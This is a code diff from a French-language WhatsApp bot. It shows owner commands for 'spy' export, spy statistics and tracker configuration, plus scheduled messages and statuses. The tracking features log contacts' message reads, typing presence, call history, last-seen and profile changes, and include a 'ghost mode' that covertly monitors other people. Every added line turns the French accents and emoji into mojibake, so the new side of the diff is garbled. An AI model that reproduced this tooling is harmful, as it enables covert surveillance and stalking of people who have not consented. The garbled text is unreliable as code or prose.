-      // Réponses
+      // RÃ©ponses
       if (spyData.replies && spyData.replies.length > 0) {
-        exportData += `↩️ RÉPONSES (${spyData.replies.length})\n`;
-        exportData += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        exportData += `â†©ï¸ RÃ‰PONSES (${spyData.replies.length})\n`;
+        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
         for (const r of spyData.replies.slice(-20)) {
           const preview = r.preview ? r.preview.slice(0, 50) : "";
-          exportData += `• ${r.replierName || "?"}: "${preview}"\n`;
+          exportData += `â€¢ ${r.replierName || "?"}: "${preview}"\n`;
         }
         exportData += `\n`;
       }
       
-      // Présences
+      // PrÃ©sences
       if (spyData.presenceDetected && spyData.presenceDetected.length > 0) {
-        exportData += `✍️ PRÉSENCES DÉTECTÉES (${spyData.presenceDetected.length})\n`;
-        exportData += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        exportData += `âœï¸ PRÃ‰SENCES DÃ‰TECTÃ‰ES (${spyData.presenceDetected.length})\n`;
+        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
         for (const p of spyData.presenceDetected.slice(-20)) {
-          const action = p.action === "composing" ? "Écrit" : p.action === "recording" ? "Enregistre" : "Actif";
-          exportData += `• ${p.name || "?"} (${p.number}) - ${action}\n`;
+          const action = p.action === "composing" ? "Ã‰crit" : p.action === "recording" ? "Enregistre" : "Actif";
+          exportData += `â€¢ ${p.name || "?"} (${p.number}) - ${action}\n`;
         }
         exportData += `\n`;
       }
       
       // Appels
       if (spyData.callHistory && spyData.callHistory.length > 0) {
-        exportData += `📞 HISTORIQUE APPELS (${spyData.callHistory.length})\n`;
-        exportData += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        exportData += `ðŸ“ž HISTORIQUE APPELS (${spyData.callHistory.length})\n`;
+        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
         for (const c of spyData.callHistory.slice(-20)) {
-          const type = c.type === 'video' ? '📹' : '📞';
-          const dir = c.direction === 'in' ? 'Reçu' : 'Émis';
-          exportData += `• ${type} ${c.name || "?"} - ${dir} - ${new Date(c.timestamp).toLocaleString("fr-FR")}\n`;
+          const type = c.type === 'video' ? 'ðŸ“¹' : 'ðŸ“ž';
+          const dir = c.direction === 'in' ? 'ReÃ§u' : 'Ã‰mis';
+          exportData += `â€¢ ${type} ${c.name || "?"} - ${dir} - ${new Date(c.timestamp).toLocaleString("fr-FR")}\n`;
         }
         exportData += `\n`;
       }
       
-      exportData += `═══════════════════════════════════════\n`;
+      exportData += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       exportData += `   FIN DE L'EXPORT\n`;
-      exportData += `═══════════════════════════════════════\n`;
+      exportData += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       
       return send(exportData);
     }
@@ -2602,7 +2602,7 @@ async function handleCommand(hani, msg, db) {
     case "spystats":
     case "statsespion":
     case "statistiques": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const param = args?.toLowerCase();
       const now = Date.now();
@@ -2621,7 +2621,7 @@ async function handleCommand(hani, msg, db) {
         periodName = "ce mois";
       }
       
-      // Filtrer par période
+      // Filtrer par pÃ©riode
       const filterByPeriod = (arr, timestampKey = "timestamp") => {
         return (arr || []).filter(item => {
           const ts = item[timestampKey] || item.timestamp || 0;
@@ -2654,18 +2654,18 @@ async function handleCommand(hani, msg, db) {
         .sort((a, b) => b[1] - a[1])
         .slice(0, 5);
       
-      let stats = `📊 ═══════════════════════════\n   *STATISTIQUES ESPION*\n   _${periodName}_\n═══════════════════════════\n\n`;
+      let stats = `ðŸ“Š â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *STATISTIQUES ESPION*\n   _${periodName}_\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      stats += `📈 *RÉSUMÉ:*\n`;
-      stats += `• 👁️ Vues statuts: ${statusViewsPeriod.length}\n`;
-      stats += `• 📖 Messages lus: ${readsPeriod.length}\n`;
-      stats += `• ↩️ Réponses: ${repliesPeriod.length}\n`;
-      stats += `• ✍️ Présences: ${presencePeriod.length}\n`;
-      stats += `• 📞 Appels: ${callsPeriod.length}\n`;
-      stats += `• 👥 Événements groupe: ${groupPeriod.length}\n\n`;
+      stats += `ðŸ“ˆ *RÃ‰SUMÃ‰:*\n`;
+      stats += `â€¢ ðŸ‘ï¸ Vues statuts: ${statusViewsPeriod.length}\n`;
+      stats += `â€¢ ðŸ“– Messages lus: ${readsPeriod.length}\n`;
+      stats += `â€¢ â†©ï¸ RÃ©ponses: ${repliesPeriod.length}\n`;
+      stats += `â€¢ âœï¸ PrÃ©sences: ${presencePeriod.length}\n`;
+      stats += `â€¢ ðŸ“ž Appels: ${callsPeriod.length}\n`;
+      stats += `â€¢ ðŸ‘¥ Ã‰vÃ©nements groupe: ${groupPeriod.length}\n\n`;
       
       if (topViewers.length > 0) {
-        stats += `🏆 *TOP VIEWERS STATUTS:*\n`;
+        stats += `ðŸ† *TOP VIEWERS STATUTS:*\n`;
         for (let i = 0; i < topViewers.length; i++) {
           const [viewer, count] = topViewers[i];
           stats += `${i + 1}. ${viewer.replace(/[^0-9]/g, '').slice(-10)} (${count} vues)\n`;
@@ -2674,7 +2674,7 @@ async function handleCommand(hani, msg, db) {
       }
       
       if (topReaders.length > 0) {
-        stats += `🏆 *TOP LECTEURS:*\n`;
+        stats += `ðŸ† *TOP LECTEURS:*\n`;
         for (let i = 0; i < topReaders.length; i++) {
           const [reader, count] = topReaders[i];
           stats += `${i + 1}. ${reader.replace(/[^0-9]/g, '').slice(-10)} (${count} lectures)\n`;
@@ -2682,11 +2682,11 @@ async function handleCommand(hani, msg, db) {
         stats += `\n`;
       }
       
-      stats += `═══════════════════════════\n`;
-      stats += `📋 *Périodes:*\n`;
-      stats += `• \`.spystats\` → Aujourd'hui\n`;
-      stats += `• \`.spystats semaine\` → Cette semaine\n`;
-      stats += `• \`.spystats mois\` → Ce mois`;
+      stats += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      stats += `ðŸ“‹ *PÃ©riodes:*\n`;
+      stats += `â€¢ \`.spystats\` â†’ Aujourd'hui\n`;
+      stats += `â€¢ \`.spystats semaine\` â†’ Cette semaine\n`;
+      stats += `â€¢ \`.spystats mois\` â†’ Ce mois`;
       
       return send(stats);
     }
@@ -2694,7 +2694,7 @@ async function handleCommand(hani, msg, db) {
     case "trackconfig":
     case "spyconfig":
     case "configespion": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const param = args?.toLowerCase()?.split(" ")[0];
       const value = args?.toLowerCase()?.split(" ")[1];
@@ -2705,61 +2705,61 @@ async function handleCommand(hani, msg, db) {
         switch (param) {
           case "lastseen":
             spyConfig.trackLastSeen = boolValue;
-            return send(`🕐 Tracker connexions: ${boolValue ? "✅ ON" : "❌ OFF"}`);
+            return send(`ðŸ• Tracker connexions: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
           case "photo":
             spyConfig.alertPhotoChange = boolValue;
-            return send(`📷 Alertes photo: ${boolValue ? "✅ ON" : "❌ OFF"}`);
+            return send(`ðŸ“· Alertes photo: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
           case "bio":
             spyConfig.alertBioChange = boolValue;
-            return send(`📝 Alertes bio: ${boolValue ? "✅ ON" : "❌ OFF"}`);
+            return send(`ðŸ“ Alertes bio: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
           case "name":
             spyConfig.alertNameChange = boolValue;
-            return send(`👤 Alertes nom: ${boolValue ? "✅ ON" : "❌ OFF"}`);
+            return send(`ðŸ‘¤ Alertes nom: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
           case "calls":
             spyConfig.trackCalls = boolValue;
-            return send(`📞 Tracker appels: ${boolValue ? "✅ ON" : "❌ OFF"}`);
+            return send(`ðŸ“ž Tracker appels: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
           case "groups":
             spyConfig.trackGroups = boolValue;
-            return send(`👥 Tracker groupes: ${boolValue ? "✅ ON" : "❌ OFF"}`);
+            return send(`ðŸ‘¥ Tracker groupes: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
         }
       }
       
-      let config = `⚙️ ═══════════════════════════\n   *CONFIGURATION ESPION*\n═══════════════════════════\n\n`;
+      let config = `âš™ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *CONFIGURATION ESPION*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      config += `🔍 *TRACKERS:*\n`;
-      config += `• 🕐 Connexions: ${spyConfig.trackLastSeen ? "✅" : "❌"}\n`;
-      config += `• 📞 Appels: ${spyConfig.trackCalls ? "✅" : "❌"}\n`;
-      config += `• 👥 Groupes: ${spyConfig.trackGroups ? "✅" : "❌"}\n\n`;
+      config += `ðŸ” *TRACKERS:*\n`;
+      config += `â€¢ ðŸ• Connexions: ${spyConfig.trackLastSeen ? "âœ…" : "âŒ"}\n`;
+      config += `â€¢ ðŸ“ž Appels: ${spyConfig.trackCalls ? "âœ…" : "âŒ"}\n`;
+      config += `â€¢ ðŸ‘¥ Groupes: ${spyConfig.trackGroups ? "âœ…" : "âŒ"}\n\n`;
       
-      config += `🔔 *ALERTES PROFIL:*\n`;
-      config += `• 📷 Photo: ${spyConfig.alertPhotoChange ? "✅" : "❌"}\n`;
-      config += `• 📝 Bio: ${spyConfig.alertBioChange ? "✅" : "❌"}\n`;
-      config += `• 👤 Nom: ${spyConfig.alertNameChange ? "✅" : "❌"}\n\n`;
+      config += `ðŸ”” *ALERTES PROFIL:*\n`;
+      config += `â€¢ ðŸ“· Photo: ${spyConfig.alertPhotoChange ? "âœ…" : "âŒ"}\n`;
+      config += `â€¢ ðŸ“ Bio: ${spyConfig.alertBioChange ? "âœ…" : "âŒ"}\n`;
+      config += `â€¢ ðŸ‘¤ Nom: ${spyConfig.alertNameChange ? "âœ…" : "âŒ"}\n\n`;
       
-      config += `👻 *MODE FANTÔME:*\n`;
-      config += `• Global: ${spyConfig.ghostMode ? "✅ ACTIF" : "❌ INACTIF"}\n\n`;
+      config += `ðŸ‘» *MODE FANTÃ”ME:*\n`;
+      config += `â€¢ Global: ${spyConfig.ghostMode ? "âœ… ACTIF" : "âŒ INACTIF"}\n\n`;
       
-      config += `═══════════════════════════\n`;
-      config += `📋 *Modifier:*\n`;
+      config += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      config += `ðŸ“‹ *Modifier:*\n`;
       config += `\`.spyconfig [option] [on/off]\`\n\n`;
       config += `Options: lastseen, photo, bio, name, calls, groups`;
       
       return send(config);
     }
 
-    // ────────── 📅 MESSAGES PROGRAMMÉS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“… MESSAGES PROGRAMMÃ‰S â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     case "schedule":
     case "programmer":
     case "planifier": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
-      // Format: .schedule 22550252467 14:30 Message à envoyer
-      // Ou: .schedule @mention 14:30 Message à envoyer
+      // Format: .schedule 22550252467 14:30 Message Ã  envoyer
+      // Ou: .schedule @mention 14:30 Message Ã  envoyer
       const parts = args?.split(" ") || [];
       
       if (parts.length < 3) {
-        return send(`📅 *PROGRAMMER UN MESSAGE*\n\n📋 *Usage:*\n\`.schedule [numéro] [heure] [message]\`\n\n📝 *Exemples:*\n• \`.schedule 22550252467 14:30 Salut ça va?\`\n• \`.schedule 22550252467 8:00 Bonjour!\`\n• \`.schedule 33612345678 20h00 Bonne soirée\`\n\n⏰ *Formats d'heure acceptés:*\n• 14:30 ou 14h30 ou 1430\n• 8:00 ou 8h ou 08:00\n\n💡 *Autres commandes:*\n• \`.schedulelist\` → Voir les messages programmés\n• \`.scheduledel [id]\` → Supprimer un message\n• \`.schedulerepeat\` → Message récurrent`);
+        return send(`ðŸ“… *PROGRAMMER UN MESSAGE*\n\nðŸ“‹ *Usage:*\n\`.schedule [numÃ©ro] [heure] [message]\`\n\nðŸ“ *Exemples:*\nâ€¢ \`.schedule 22550252467 14:30 Salut Ã§a va?\`\nâ€¢ \`.schedule 22550252467 8:00 Bonjour!\`\nâ€¢ \`.schedule 33612345678 20h00 Bonne soirÃ©e\`\n\nâ° *Formats d'heure acceptÃ©s:*\nâ€¢ 14:30 ou 14h30 ou 1430\nâ€¢ 8:00 ou 8h ou 08:00\n\nðŸ’¡ *Autres commandes:*\nâ€¢ \`.schedulelist\` â†’ Voir les messages programmÃ©s\nâ€¢ \`.scheduledel [id]\` â†’ Supprimer un message\nâ€¢ \`.schedulerepeat\` â†’ Message rÃ©current`);
       }
       
       let targetNumber = parts[0].replace(/[^0-9]/g, '');
@@ -2770,7 +2770,7 @@ async function handleCommand(hani, msg, db) {
       // Remplacer 'h' par ':' et supprimer les espaces
       timeStr = timeStr.toLowerCase().replace(/h/g, ':').replace(/\s/g, '');
       
-      // Si format HHMM sans séparateur (ex: 1430)
+      // Si format HHMM sans sÃ©parateur (ex: 1430)
       if (/^\d{3,4}$/.test(timeStr)) {
         const padded = timeStr.padStart(4, '0');
         timeStr = padded.slice(0, 2) + ':' + padded.slice(2);
@@ -2786,32 +2786,32 @@ async function handleCommand(hani, msg, db) {
         timeStr = timeStr.padStart(2, '0') + ':00';
       }
       
-      // Vérifier le format final de l'heure
+      // VÃ©rifier le format final de l'heure
       const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
       if (!timeMatch) {
-        return send(`❌ *Format d'heure non reconnu:* "${parts[1]}"\n\n⏰ *Formats acceptés:*\n• 14:30 ou 14h30\n• 8:00 ou 8h00 ou 08:00\n• 1430 (sans séparateur)\n• 14 (pour 14:00)\n\n📝 *Exemple:*\n\`.schedule 22550252467 14:30 Salut!\``);
+        return send(`âŒ *Format d'heure non reconnu:* "${parts[1]}"\n\nâ° *Formats acceptÃ©s:*\nâ€¢ 14:30 ou 14h30\nâ€¢ 8:00 ou 8h00 ou 08:00\nâ€¢ 1430 (sans sÃ©parateur)\nâ€¢ 14 (pour 14:00)\n\nðŸ“ *Exemple:*\n\`.schedule 22550252467 14:30 Salut!\``);
       }
       
       const hours = parseInt(timeMatch[1]);
       const minutes = parseInt(timeMatch[2]);
       
       if (hours < 0 || hours > 23 || minutes < 0 || minutes > 59) {
-        return send(`❌ Heure invalide.\n\n⏰ L'heure doit être entre 00:00 et 23:59`);
+        return send(`âŒ Heure invalide.\n\nâ° L'heure doit Ãªtre entre 00:00 et 23:59`);
       }
       
       // Calculer l'heure d'envoi
       const now = new Date();
       let scheduledDate = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hours, minutes, 0);
       
-      // Si l'heure est déjà passée aujourd'hui, programmer pour demain
+      // Si l'heure est dÃ©jÃ  passÃ©e aujourd'hui, programmer pour demain
       if (scheduledDate.getTime() < now.getTime()) {
         scheduledDate.setDate(scheduledDate.getDate() + 1);
       }
       
-      // Créer le JID
+      // CrÃ©er le JID
       const targetJid = targetNumber + "@s.whatsapp.net";
       
-      // Récupérer le nom du contact
+      // RÃ©cupÃ©rer le nom du contact
       let targetName = targetNumber;
       try {
         const contact = await hani.onWhatsApp(targetJid);
@@ -2820,7 +2820,7 @@ async function handleCommand(hani, msg, db) {
         }
       } catch (e) {}
       
-      // Créer le message programmé
+      // CrÃ©er le message programmÃ©
       const scheduledMsg = {
         id: Date.now(),
         targetJid,
@@ -2835,25 +2835,25 @@ async function handleCommand(hani, msg, db) {
       
       scheduledMessages.push(scheduledMsg);
       
-      // Démarrer le scheduler si pas encore fait
+      // DÃ©marrer le scheduler si pas encore fait
       startScheduler(hani);
       
       const timeDisplay = scheduledDate.toLocaleString("fr-FR");
       const isToday = scheduledDate.getDate() === now.getDate();
       
-      return send(`📅 *Message programmé!*\n\n👤 *À:* ${targetName}\n📱 *Numéro:* +${targetNumber}\n💬 *Message:* "${message.slice(0, 100)}${message.length > 100 ? '...' : ''}"\n⏰ *Envoi:* ${timeDisplay}\n📆 ${isToday ? "Aujourd'hui" : "Demain"}\n\n🆔 ID: ${scheduledMsg.id}\n\n💡 \`.schedulelist\` pour voir tous les messages`);
+      return send(`ðŸ“… *Message programmÃ©!*\n\nðŸ‘¤ *Ã€:* ${targetName}\nðŸ“± *NumÃ©ro:* +${targetNumber}\nðŸ’¬ *Message:* "${message.slice(0, 100)}${message.length > 100 ? '...' : ''}"\nâ° *Envoi:* ${timeDisplay}\nðŸ“† ${isToday ? "Aujourd'hui" : "Demain"}\n\nðŸ†” ID: ${scheduledMsg.id}\n\nðŸ’¡ \`.schedulelist\` pour voir tous les messages`);
     }
 
     case "schedulerepeat":
     case "programmerrepeat":
     case "messagerecurrent": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       // Format: .schedulerepeat 22550252467 08:00 daily Bonjour!
       const parts = args?.split(" ") || [];
       
       if (parts.length < 4) {
-        return send(`📅 *MESSAGE RÉCURRENT*\n\n📋 *Usage:*\n\`.schedulerepeat [numéro] [heure] [fréquence] [message]\`\n\n📝 *Fréquences:*\n• \`daily\` → Tous les jours\n• \`weekly\` → Chaque semaine\n• \`monthly\` → Chaque mois\n\n📝 *Exemple:*\n\`.schedulerepeat 22550252467 8:00 daily Bonjour!\`\n\n⏰ *Formats d'heure:* 8:00, 08h00, 0800`);
+        return send(`ðŸ“… *MESSAGE RÃ‰CURRENT*\n\nðŸ“‹ *Usage:*\n\`.schedulerepeat [numÃ©ro] [heure] [frÃ©quence] [message]\`\n\nðŸ“ *FrÃ©quences:*\nâ€¢ \`daily\` â†’ Tous les jours\nâ€¢ \`weekly\` â†’ Chaque semaine\nâ€¢ \`monthly\` â†’ Chaque mois\n\nðŸ“ *Exemple:*\n\`.schedulerepeat 22550252467 8:00 daily Bonjour!\`\n\nâ° *Formats d'heure:* 8:00, 08h00, 0800`);
       }
       
       let targetNumber = parts[0].replace(/[^0-9]/g, '');
@@ -2861,9 +2861,9 @@ async function handleCommand(hani, msg, db) {
       const repeat = parts[2].toLowerCase();
       const message = parts.slice(3).join(" ");
       
-      // Vérifier la fréquence
+      // VÃ©rifier la frÃ©quence
       if (!['daily', 'weekly', 'monthly'].includes(repeat)) {
-        return send(`❌ Fréquence invalide.\n\nUtilise: daily, weekly, ou monthly`);
+        return send(`âŒ FrÃ©quence invalide.\n\nUtilise: daily, weekly, ou monthly`);
       }
       
       // Normaliser le format de l'heure
@@ -2879,10 +2879,10 @@ async function handleCommand(hani, msg, db) {
         timeStr = timeStr.padStart(2, '0') + ':00';
       }
       
-      // Vérifier le format de l'heure
+      // VÃ©rifier le format de l'heure
       const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
       if (!timeMatch) {
-        return send(`❌ Format d'heure non reconnu: "${parts[1]}"\n\n⏰ Formats: 14:30, 14h30, 1430, 8:00`);
+        return send(`âŒ Format d'heure non reconnu: "${parts[1]}"\n\nâ° Formats: 14:30, 14h30, 1430, 8:00`);
       }
       
       const hours = parseInt(timeMatch[1]);
@@ -2923,40 +2923,40 @@ async function handleCommand(hani, msg, db) {
       
       const freqLabels = { daily: "Tous les jours", weekly: "Chaque semaine", monthly: "Chaque mois" };
       
-      return send(`📅 *Message récurrent programmé!*\n\n👤 *À:* ${targetName}\n📱 *Numéro:* +${targetNumber}\n💬 *Message:* "${message.slice(0, 80)}..."\n⏰ *Heure:* ${timeStr}\n🔄 *Fréquence:* ${freqLabels[repeat]}\n📆 *Prochain envoi:* ${scheduledDate.toLocaleString("fr-FR")}\n\n🆔 ID: ${scheduledMsg.id}`);
+      return send(`ðŸ“… *Message rÃ©current programmÃ©!*\n\nðŸ‘¤ *Ã€:* ${targetName}\nðŸ“± *NumÃ©ro:* +${targetNumber}\nðŸ’¬ *Message:* "${message.slice(0, 80)}..."\nâ° *Heure:* ${timeStr}\nðŸ”„ *FrÃ©quence:* ${freqLabels[repeat]}\nðŸ“† *Prochain envoi:* ${scheduledDate.toLocaleString("fr-FR")}\n\nðŸ†” ID: ${scheduledMsg.id}`);
     }
 
     case "schedulelist":
     case "programmelist":
     case "listeprogrammes": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const activeMessages = scheduledMessages.filter(m => m.active);
       
       if (activeMessages.length === 0) {
-        return send(`📅 *Aucun message programmé*\n\n💡 Utilise \`.schedule\` pour programmer un message.\n\n📝 *Exemple:*\n\`.schedule 22550252467 14:30 Salut!\``);
+        return send(`ðŸ“… *Aucun message programmÃ©*\n\nðŸ’¡ Utilise \`.schedule\` pour programmer un message.\n\nðŸ“ *Exemple:*\n\`.schedule 22550252467 14:30 Salut!\``);
       }
       
-      let list = `📅 ═══════════════════════════\n   *MESSAGES PROGRAMMÉS*\n═══════════════════════════\n\n`;
+      let list = `ðŸ“… â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *MESSAGES PROGRAMMÃ‰S*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
       for (const msg of activeMessages) {
         const nextSend = new Date(msg.scheduledTime).toLocaleString("fr-FR");
-        const repeatLabel = msg.repeat === 'once' ? '⏱️ Une fois' : 
-                           msg.repeat === 'daily' ? '🔄 Quotidien' : 
-                           msg.repeat === 'weekly' ? '🔄 Hebdo' : 
-                           msg.repeat === 'monthly' ? '🔄 Mensuel' : '⏱️';
+        const repeatLabel = msg.repeat === 'once' ? 'â±ï¸ Une fois' : 
+                           msg.repeat === 'daily' ? 'ðŸ”„ Quotidien' : 
+                           msg.repeat === 'weekly' ? 'ðŸ”„ Hebdo' : 
+                           msg.repeat === 'monthly' ? 'ðŸ”„ Mensuel' : 'â±ï¸';
         
-        list += `🆔 *${msg.id}*\n`;
-        list += `👤 ${msg.targetName}\n`;
-        list += `📱 +${msg.targetJid.split("@")[0]}\n`;
-        list += `💬 "${msg.message.slice(0, 40)}..."\n`;
-        list += `⏰ ${nextSend}\n`;
+        list += `ðŸ†” *${msg.id}*\n`;
+        list += `ðŸ‘¤ ${msg.targetName}\n`;
+        list += `ðŸ“± +${msg.targetJid.split("@")[0]}\n`;
+        list += `ðŸ’¬ "${msg.message.slice(0, 40)}..."\n`;
+        list += `â° ${nextSend}\n`;
         list += `${repeatLabel}\n\n`;
       }
       
-      list += `═══════════════════════════\n`;
-      list += `📊 *Total:* ${activeMessages.length} message(s)\n\n`;
-      list += `💡 \`.scheduledel [id]\` pour supprimer`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      list += `ðŸ“Š *Total:* ${activeMessages.length} message(s)\n\n`;
+      list += `ðŸ’¡ \`.scheduledel [id]\` pour supprimer`;
       
       return send(list);
     }
@@ -2964,73 +2964,73 @@ async function handleCommand(hani, msg, db) {
     case "scheduledel":
     case "schedulecancel":
     case "supprimerprogramme": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const msgId = parseInt(args);
       
       if (!msgId) {
-        return send(`❌ *Usage:* \`.scheduledel [id]\`\n\n💡 Utilise \`.schedulelist\` pour voir les IDs`);
+        return send(`âŒ *Usage:* \`.scheduledel [id]\`\n\nðŸ’¡ Utilise \`.schedulelist\` pour voir les IDs`);
       }
       
       const index = scheduledMessages.findIndex(m => m.id === msgId);
       
       if (index === -1) {
-        return send(`❌ Message programmé #${msgId} non trouvé.`);
+        return send(`âŒ Message programmÃ© #${msgId} non trouvÃ©.`);
       }
       
       const deleted = scheduledMessages[index];
       scheduledMessages.splice(index, 1);
       
-      return send(`🗑️ *Message programmé supprimé*\n\n🆔 ID: ${deleted.id}\n👤 À: ${deleted.targetName}\n💬 "${deleted.message.slice(0, 50)}..."`);
+      return send(`ðŸ—‘ï¸ *Message programmÃ© supprimÃ©*\n\nðŸ†” ID: ${deleted.id}\nðŸ‘¤ Ã€: ${deleted.targetName}\nðŸ’¬ "${deleted.message.slice(0, 50)}..."`);
     }
 
     case "scheduleclear":
     case "clearschedule": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const count = scheduledMessages.length;
       scheduledMessages.length = 0;
       
-      return send(`🗑️ *Tous les messages programmés supprimés*\n\n📊 ${count} message(s) effacé(s)`);
+      return send(`ðŸ—‘ï¸ *Tous les messages programmÃ©s supprimÃ©s*\n\nðŸ“Š ${count} message(s) effacÃ©(s)`);
     }
 
     case "schedulepause":
     case "pauseprogramme": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const msgId = parseInt(args);
       
       if (!msgId) {
-        return send(`❌ *Usage:* \`.schedulepause [id]\`\n\n💡 Utilise \`.schedulelist\` pour voir les IDs`);
+        return send(`âŒ *Usage:* \`.schedulepause [id]\`\n\nðŸ’¡ Utilise \`.schedulelist\` pour voir les IDs`);
       }
       
       const msg = scheduledMessages.find(m => m.id === msgId);
       
       if (!msg) {
-        return send(`❌ Message programmé #${msgId} non trouvé.`);
+        return send(`âŒ Message programmÃ© #${msgId} non trouvÃ©.`);
       }
       
       msg.active = !msg.active;
       
-      return send(`${msg.active ? "▶️ *Message réactivé*" : "⏸️ *Message mis en pause*"}\n\n🆔 ID: ${msg.id}\n👤 À: ${msg.targetName}`);
+      return send(`${msg.active ? "â–¶ï¸ *Message rÃ©activÃ©*" : "â¸ï¸ *Message mis en pause*"}\n\nðŸ†” ID: ${msg.id}\nðŸ‘¤ Ã€: ${msg.targetName}`);
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // 📸 STATUTS PROGRAMMÉS (Stories WhatsApp)
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // ðŸ“¸ STATUTS PROGRAMMÃ‰S (Stories WhatsApp)
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     
     case "statusschedule":
     case "schedulestatus":
     case "programstatus":
     case "statutprogramme": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       // Format: .statusschedule 14:30 [texte du statut]
-      // Ou répondre à une image/vidéo avec: .statusschedule 14:30 [légende]
+      // Ou rÃ©pondre Ã  une image/vidÃ©o avec: .statusschedule 14:30 [lÃ©gende]
       const parts = args?.split(" ") || [];
       
       if (parts.length < 1) {
-        return send(`📸 *PROGRAMMER UN STATUT*\n\n📋 *Usage:*\n\n*Statut texte:*\n\`.statusschedule [heure] [texte]\`\nEx: \`.statusschedule 14:30 Bonne journée à tous!\`\n\n*Statut image/vidéo:*\nRéponds à une image ou vidéo avec:\n\`.statusschedule [heure] [légende]\`\nEx: \`.statusschedule 20:00 Mon nouveau look\`\n\n⏰ *Formats:* 14:30, 14h30, 8:00\n\n💡 *Autres commandes:*\n• \`.statuslist\` → Voir statuts programmés\n• \`.statusdel [id]\` → Supprimer\n• \`.statusrepeat\` → Statut récurrent`);
+        return send(`ðŸ“¸ *PROGRAMMER UN STATUT*\n\nðŸ“‹ *Usage:*\n\n*Statut texte:*\n\`.statusschedule [heure] [texte]\`\nEx: \`.statusschedule 14:30 Bonne journÃ©e Ã  tous!\`\n\n*Statut image/vidÃ©o:*\nRÃ©ponds Ã  une image ou vidÃ©o avec:\n\`.statusschedule [heure] [lÃ©gende]\`\nEx: \`.statusschedule 20:00 Mon nouveau look\`\n\nâ° *Formats:* 14:30, 14h30, 8:00\n\nðŸ’¡ *Autres commandes:*\nâ€¢ \`.statuslist\` â†’ Voir statuts programmÃ©s\nâ€¢ \`.statusdel [id]\` â†’ Supprimer\nâ€¢ \`.statusrepeat\` â†’ Statut rÃ©current`);
       }
       
       let timeStr = parts[0];
@@ -3047,14 +3047,14 @@ async function handleCommand(hani, msg, db) {
       
       const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
       if (!timeMatch) {
